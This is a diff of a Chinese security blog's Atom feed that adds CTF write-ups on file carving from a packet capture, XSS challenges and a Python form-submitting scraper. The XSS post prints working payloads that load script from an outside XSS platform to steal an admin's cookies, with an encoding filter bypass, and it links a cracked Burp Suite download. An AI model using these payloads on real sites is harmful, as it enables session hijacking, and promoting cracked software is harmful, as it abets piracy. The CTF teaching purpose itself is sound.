@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://kkkiona.github.io/"/>
-  <updated>2019-04-20T09:38:58.107Z</updated>
+  <updated>2019-04-21T02:59:09.337Z</updated>
   <id>https://kkkiona.github.io/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>数据包文件包含</title>
+    <link href="https://kkkiona.github.io/2019/04/21/%E6%95%B0%E6%8D%AE%E5%8C%85%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <id>https://kkkiona.github.io/2019/04/21/数据包文件包含/</id>
+    <published>2019-04-21T01:54:27.000Z</published>
+    <updated>2019-04-21T02:59:09.337Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这也是一道关于数据抓包文件分析的题目。</p><p><strong>题目</strong></p><p>题目给出了一个抓包数据。<br><img src="/2019/04/21/数据包文件包含/Image0001.png" alt><br><a id="more"></a><br>通过对各项目的大致浏览发现，并没有明显的图片，音频等媒体文件的传输。尝试各项提取果然也没有结果。<br><img src="/2019/04/21/数据包文件包含/Image0002.png" alt><br>尝试跟踪TCP。<br><img src="/2019/04/21/数据包文件包含/Image0003.png" alt><br>并没有有价值的信息。<br>看到题目提示 <strong>something about file</strong> ，联想到之前的文件隐藏，猜测可能包含了其他文件。</p><p>利用cmd的copy指令可以将两个文件关联在一起，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b a.zip+b.jpg c.jpg</span><br></pre></td></tr></table></figure></p><p>这会生成一个c.jpg文件，通过把文件后缀改回zip可以提取出b.jpg。但是本题的文件并不适合修改后缀名的做法。也就是说它并不是通过打包为压缩文件的方式实现的。</p><p>可以使用binwalk进行分析。</p><p>在kali Linux里面使用binwalk分析结果<br><img src="/2019/04/21/数据包文件包含/Image0004.png" alt><br>binwalk的结果显示<strong>194314—— 0x2F70A</strong>这段位置，存储了一个flag.txt文件。</p><p><strong>提取方法一</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e 文件名</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/21/数据包文件包含/Image0005.png" alt><br><strong>提取方法二</strong></p><p>binwalk -e 是按照binwalk配置文件预定义的提取方式提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=输入文件 of=输出文件 skip=跳过单元 bs=读取大小 count=读取总数</span><br></pre></td></tr></table></figure><p>也可以使用dd指令提取文件。<br><strong>提取方法三</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install foremost //如果没有安装过 需要先安装foremost</span><br><span class="line">foremost 文件</span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;这也是一道关于数据抓包文件分析的题目。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;题目给出了一个抓包数据。&lt;br&gt;&lt;img src=&quot;/2019/04/21/数据包文件包含/Image0001.png&quot; alt&gt;&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>流量分析题</title>
@@ -194,50 +214,6 @@
   </entry>
   
   <entry>
-    <title>Success</title>
-    <link href="https://kkkiona.github.io/2019/04/12/Success/"/>
-    <id>https://kkkiona.github.io/2019/04/12/Success/</id>
-    <published>2019-04-12T14:10:11.000Z</published>
-    <updated>2019-04-12T14:12:45.689Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://img-blog.csdnimg.cn/20190412231250424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1000分纪念一下。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>随笔-19-04-12</title>
-    <link href="https://kkkiona.github.io/2019/04/12/%E9%9A%8F%E7%AC%94-19-04-12/"/>
-    <id>https://kkkiona.github.io/2019/04/12/随笔-19-04-12/</id>
-    <published>2019-04-12T10:12:15.000Z</published>
-    <updated>2019-04-12T10:13:22.312Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>停了一天电，刚才发文的时候发现图床又炸了，准备用hexo的静态关联了。一会修复图片问题。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
-      
-    
-    </summary>
-    
-    
-      <category term="随笔" scheme="https://kkkiona.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
-    
-  </entry>
-  
-  <entry>
     <title>SSTI服务端模板注入</title>
     <link href="https://kkkiona.github.io/2019/04/12/SSTI%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
     <id>https://kkkiona.github.io/2019/04/12/SSTI服务端模板注入/</id>
@@ -252,29 +228,6 @@
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>随笔-19-4-11</title>
-    <link href="https://kkkiona.github.io/2019/04/11/%E9%9A%8F%E7%AC%94-19-4-11/"/>
-    <id>https://kkkiona.github.io/2019/04/11/随笔-19-4-11/</id>
-    <published>2019-04-11T12:56:59.000Z</published>
-    <updated>2019-04-11T13:02:53.179Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天连肝两道高分大题，第三道题刚好处于关键时期，如果做出来时间太晚了的话，就一早再发具体做法，先大致说一下。</p><p>第一道题 confusion 1 图片的意思是Python VS PHP 在任何一个404页面里面能看到备注提示 flag在哪。通过SSTI 可以解出来，注意伪装成PHP的Python。<br>第二题  basicFIleinclude  通过伪造php协议可以读出来 flag.php的源码</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
-      
-    
-    </summary>
-    
-    
-      <category term="随笔" scheme="https://kkkiona.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
     
   </entry>
   
@@ -358,29 +311,6 @@
   </entry>
   
   <entry>
-    <title>XSS 随笔 02</title>
-    <link href="https://kkkiona.github.io/2019/04/08/XSS%20%E9%9A%8F%E7%AC%94%2003/"/>
-    <id>https://kkkiona.github.io/2019/04/08/XSS 随笔 03/</id>
-    <published>2019-04-08T15:37:00.240Z</published>
-    <updated>2019-04-08T15:44:24.693Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这两天一直肝到两点多才睡觉，今天终于搞完了实在是坚持不了了，就先写这一篇XSS简介吧，具体的攻击步骤明天再发吧！<br><img src="https://img-blog.csdnimg.cn/20190408233653588.jpg" alt="在这里插入图片描述"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
-      
-    
-    </summary>
-    
-    
-      <category term="随笔" scheme="https://kkkiona.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
-    
-  </entry>
-  
-  <entry>
     <title>什么是 XSS</title>
     <link href="https://kkkiona.github.io/2019/04/08/%E4%BB%80%E4%B9%88%E6%98%AFXSS/"/>
     <id>https://kkkiona.github.io/2019/04/08/什么是XSS/</id>
@@ -427,13 +357,73 @@
   </entry>
   
   <entry>
-    <title>XSS 随笔 02</title>
-    <link href="https://kkkiona.github.io/2019/04/08/XSS%E9%9A%8F%E7%AC%9402/"/>
-    <id>https://kkkiona.github.io/2019/04/08/XSS随笔02/</id>
-    <published>2019-04-08T02:53:36.445Z</published>
-    <updated>2019-04-08T02:54:11.094Z</updated>
+    <title>XSS 题目解析（上篇）</title>
+    <link href="https://kkkiona.github.io/2019/04/08/XSS-%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89/"/>
+    <id>https://kkkiona.github.io/2019/04/08/XSS-题目解析-（上篇）/</id>
+    <published>2019-04-08T00:56:59.000Z</published>
+    <updated>2019-04-15T06:08:06.997Z</updated>
     
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>昨晚肝到两点总算是突破了防线，然而却因为漏了一个分号最后也没搞出来。今早上改好了，成功又解出来一道。干脆一鼓作气做完最后一道XSS再一起发步骤吧。<br><img src="https://img-blog.csdnimg.cn/20190408105320467.png" alt="在这里插入图片描述"></p>]]></content>
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在开始解题之前先说一下什么是<strong>Proof Of Work</strong>，一会会用到。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0001.png" alt><br><strong>Proof Of Work</strong> 简称<strong>POW</strong>中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一下就可以了，官方提供了POW的工具但是我的环境没有调试成功等我试验成功了在发出来过程，这里先用自己的Python代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from itertools import count</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5(s):</span><br><span class="line">    return hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">for i in count(100000):</span><br><span class="line">    if md5(str(i)).startswith(&apos;49ab02&apos;):</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>使用 haslib 进行MD5加密运算，创建一个 itertools 迭代器 利用cout() 方法从100000开始依次叠加 并将生成数字编码，直到找到前6位能够匹配示例字符的数字。</p><p>知道了怎么获取这个验证码现在开始解题。</p><p><strong>第一题：Baby XSS</strong></p><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0002.png" alt><br>根据题目描述，我们需要以admin的身份访问admin.php才能获取里面的flag。先点开admin.php看一下<br><a id="more"></a><br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0003.png" alt><br>果然不行，提示你不是admin。那么既然如此我们就需要获取admin的身份。由此想到获取admin的<strong>cookies</strong>然后通过<strong>Burp Suite</strong>工具修改登录时的cookies就可以了。</p><p>现在问题变成了获取cookies。题目给出了给admin发送message的文本框，自然就想到用XSS获取cookies。</p><p>先试探一下目标有没有设置过滤机制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0004.png" alt><br>发送成功，我们可以点Click me to view 看一下运行情况。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0005.png" alt><br>看来代码被原样执行了，没有做过滤处理。</p><p>这样获取cookies就很简单了，植入一个自己的Payload就可以了。我使用了一个免费的XSS平台。<a href="http://xss.tf" target="_blank" rel="noopener">http://xss.tf</a><br>创建一个项目使用默认模块就可以。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0006.png" alt><br>配置完成后，在使用界面可以看到使用说明，提供了很多使用方式。</p><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0007.png" alt><br>我们选择直接插入script标签的方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCrIpt srC=http://xss.tf/GCu&gt;&lt;/sCRipT&gt;</span><br></pre></td></tr></table></figure><p>这里的不规则大小写是为了防止过滤掉script标签，本题经测试可以无视。将代码输入message消息框并提交。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0008.png" alt><br>成功钓到了admin，展开后可以看到cookies。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0009.png" alt><br>接下来就很简单了使用<strong>Burp Suite</strong>修改cookies就可以了。我给出一个永久破解版的<strong>Burp Suite</strong>但是这个版本不是很新，最高只能使用Java 8不过不用注册机破解，已经开启了scanner功能。打开前需要先把时间设置到2017年以前，开启后在恢复时间即可。链接：<a href="https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q</a>   提取码：qun1 </p><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0010.png" alt><br>先在Proxy中的option里面添加一个代理地址和端口。然后把你的浏览器代理服务设置成这个地址端口即可。代理服务设置详见<a href="https://kkkiona.github.io/2019/04/06/VPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS/">https://kkkiona.github.io/2019/04/06/VPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS/</a></p><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0011.png" alt><br>开启intercept后，再点一下admin.php。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0012.png" alt><br>把cookies改成刚才获取到的cookies再点forward。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0013.png" alt><br>flag到手。</p><p><strong>第二题：XSS 1</strong></p><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0014.png" alt><br>题目说xss.php比较脆弱，请通过URL给admin发送请求捕获admin的cookies，里面包含了flag。</p><p>先点开xss.php看一下。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0015.png" alt><br>从给出的php代码中可以看出来对提交信息里面的” 、&lt;、&gt; 三个符号进行了过滤。先随便提交点东西试试。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0016.png" alt><br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0017.png" alt><br>从提交情况来看，我们的代码放到了script标签里面并被定义成一个字符串变量。很容易想到用”符号构造闭合语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1);//</span><br></pre></td></tr></table></figure><p>如果这段代码可以成插入，那么script标签将会变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var  a=&quot;&quot;;alert(1);//&apos;;</span><br></pre></td></tr></table></figure><p>实验<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0018.png" alt><br>果然由于”被屏蔽无法构成闭合，而且被锁死的不只是”还有&lt;、&gt;没有这些字符将很难构造我们需要的代码。</p><p>看来直接写入明文是不可能的了，由此我们想到使用“暗文”来绕过php的检测。我们可以通过转码的方式来绕过检测。</p><p>可以通过使用Unicode编码来绕过php的检测，浏览器会自动解析Unicode编码把他转换为相应的字符。此方法需要明确提交的信息执行顺序是先经过php对提交内容进行原封不动的检测，再交给浏览器解析。</p><p>使用编码工具对上面的语句进行转码。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0019.png" alt><br>把编码后的内容提交一下看看。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0020.png" alt><br>OK，成功执行。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0021.png" alt><br>那么接下来只需要植入Payload。对照你的XSS平台的使用说明，发现没有合适的使用方式，因为我们提交的内容在script标签里面，如果直接把我们的Payload写到script里面也不是不行但是过于庞大。也想到可不可以闭合script标签自己再重新构造标签，这个方法也是行不通的，我认为是因为在你的代码被解析之前，原本的script标签已经存在了所以不能闭合，而是会被解释成错误代码。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0022.png" alt><br>可以看到灰色的script标签并没有被解析。所以我们可以使用createElement()方法来把script写到body里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;;</span><br><span class="line">var s=document.createElement(&apos;script&apos;);</span><br><span class="line">document.body.appendChild(s);</span><br><span class="line">s.src=&quot;http://xss.tf/Vw6&quot;;</span><br><span class="line">//</span><br></pre></td></tr></table></figure></p><p>写入之后发现<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0023.png" alt><br>OK，执行，并且你的XSS平台也收到了提示。但是这里的信息是你本地的信息，因为提交者是你自己抓的包当然也是你的，我们需要通过URL的方式让admin来执行这个脚本。</p><p>回到题目页面把你<strong>编码后</strong>的代码放到示例URL后面<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0024.png" alt><br>提交后发现<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0025.png" alt><br>代码没了，经分析发现原来是Unicode的&amp;#阻断了传输，因为URL传输是有自己的编码的，那么我们就把代码转换成URL编码就可以了。注意是把Unicode编码好的再转一次转成encodeURIComponent编码。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0026.png" alt><br>提交编码。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0027.png" alt><br>flag在cookies里面。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在开始解题之前先说一下什么是&lt;strong&gt;Proof Of Work&lt;/strong&gt;，一会会用到。&lt;br&gt;&lt;img src=&quot;/2019/04/08/XSS-题目解析-（上篇）/Image0001.png&quot; alt&gt;&lt;br&gt;&lt;strong&gt;Proof Of Work&lt;/strong&gt; 简称&lt;strong&gt;POW&lt;/strong&gt;中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一下就可以了，官方提供了POW的工具但是我的环境没有调试成功等我试验成功了在发出来过程，这里先用自己的Python代码。&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from itertools import count&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;import hashlib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def md5(s):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return hashlib.md5(s.encode()).hexdigest()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for i in count(100000):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if md5(str(i)).startswith(&amp;apos;49ab02&amp;apos;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        print(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        break&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;使用 haslib 进行MD5加密运算，创建一个 itertools 迭代器 利用cout() 方法从100000开始依次叠加 并将生成数字编码，直到找到前6位能够匹配示例字符的数字。&lt;/p&gt;
+&lt;p&gt;知道了怎么获取这个验证码现在开始解题。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;第一题：Baby XSS&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/2019/04/08/XSS-题目解析-（上篇）/Image0002.png&quot; alt&gt;&lt;br&gt;根据题目描述，我们需要以admin的身份访问admin.php才能获取里面的flag。先点开admin.php看一下&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Python 简单的网页抓取和提交表单</title>
+    <link href="https://kkkiona.github.io/2019/04/07/Python-%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95/"/>
+    <id>https://kkkiona.github.io/2019/04/07/Python-简单的网页抓取和提交表单/</id>
+    <published>2019-04-07T12:56:59.000Z</published>
+    <updated>2019-04-15T06:07:57.961Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>环境说明：<strong>Python 3</strong><br>外部依赖：<strong>requests、bs4、BeautifulSoup</strong><br>先看题目</p><p><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0001.png" alt><br>题目很简单，就是限时计算给出的算式并提交。<br><del>方法一、计算器一台。方法很简单只需要在1.5s内计算出结果再提交就行了，大约几千左右的APM就够了。</del><br>方法二、<strong>使用网络爬虫</strong>。<br>爬虫的话自然使用Python是最方便不过的，大体思路就是<strong>抓取公式-&gt;计算-&gt;提交</strong>。<br>既然是做题那么首先第一步肯定是<strong>化简</strong>，做题最讨厌的不是不会做而是把1+1做成∞+∞。我们先多刷新几次页面看一下。<br><a id="more"></a><br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0002.png" alt><br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0003.png" alt><br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0004.png" alt><br>可以很明显看到公式采用的是x1+x2*x3-x4的固定格式。那这就简单多了，不需要判断运算符也不用修改运算顺序，直接省去了一个heap的工作量。再来看一下代码。<br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0005.png" alt><br>可以看到表单使用Get传值，传递对象是自己。<strong>GET使用URL传递参数</strong>，来测试一下URL。<br>提交前：<br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0006.png" alt><br>提交后：<br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0007.png" alt><br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0008.png" alt><br>可以看到answer的值被脚本通过URL捕获并显示相关内容。<br>现在的工作具体为抓取<strong>抓取公式-&gt;计算-&gt;生成URL-&gt;提交</strong><br>先来完成前两步工作：<br><strong>新建一个py文件，引入抓包用的requests和分析HTML结构的bs4.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br></pre></td></tr></table></figure><p><strong>向指定页面发送GET请求并获取响应</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(&quot;http://example.com/&quot;)</span><br></pre></td></tr></table></figure><p><strong>得到的response响应可以以content（二进制流）、text（文本）等多种格式输出，作为文本的时候还可以指定编码格式。<br>现以text格式输出一下看看结果。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0009.png" alt><br><strong>毫无疑问我们成功抓到了页面内容。下面需要获取公式。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(response.text, &quot;html.parser&quot;)</span><br><span class="line"></span><br><span class="line">getString = soup.find(id=&quot;exp&quot;).string</span><br><span class="line"></span><br><span class="line">Sum = int(getString.split()[2])</span><br><span class="line">Sum *= int(getString.split()[4])</span><br><span class="line">Sum += int(getString.split()[0])</span><br><span class="line">Sum -= int(getString.split()[6])</span><br></pre></td></tr></table></figure><p><strong>先把获取的文本转成BeautifulSoup对象，通过字符串截取和强制转换变成单个数字并计算。由于已经确定运算符和运算规则这里就容易很多。然后把答案插入到URL并发送GET请求</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(&quot;http://example.com/calculator/?answer=&quot; + &apos;%d&apos; % Sum)</span><br></pre></td></tr></table></figure><p>然后你会发现<br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0010.png" alt><br>提示问题页面还未建立，没有问题何来答案。<br>简述一下HTTP请求的规则：<strong>HTTP请求的三次握手</strong><br>客户端向服务端发送syn=1，seq=client请求的ID;<br>服务端向客户端发送syn=1,seq=服务端请求的ID,ack=客户端请求的ID+1;<br>客户端向服务端发送syn=0,seq=客户端请求的ID+1,ack=服务端请求的ID+1,data\data…<br>所以简单来说就是HTTP向服务器发送请求时会有一个专属ID来让服务器和客户端保持连接，这个ID存在于cookies里面。如果不连同cookies发送给服务器，那么服务器就会认为是两个不同的客户发送的请求从而出现上面的错误。所以我们要做的是<strong>连同cookies一起发送。</strong><br><strong>先从response里面获取cookies并保存。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookies = response.cookies</span><br></pre></td></tr></table></figure><p><strong>修改二次请求</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(&quot;http://example.com/?answer=&quot; + &apos;%d&apos; % Sum, cookies=Cookies)</span><br></pre></td></tr></table></figure><p>再来看一下结果<br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0011.png" alt><br>成功！<br>总结：<strong>这道题比较基础，简单的使用了Python的爬虫功能，主要是学习了HTTP请求的过程，关键在于cookies的传递。</strong></p><p><strong>忘记放出完整代码了，补上！</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">response = requests.get(&quot;http://123.207.149.64:23331/calculator/&quot;)</span><br><span class="line">Cookies = response.cookies</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(response.text, &quot;html.parser&quot;)</span><br><span class="line"></span><br><span class="line">getString = soup.find(id=&quot;exp&quot;).string</span><br><span class="line"></span><br><span class="line">Sum = int(getString.split()[2])</span><br><span 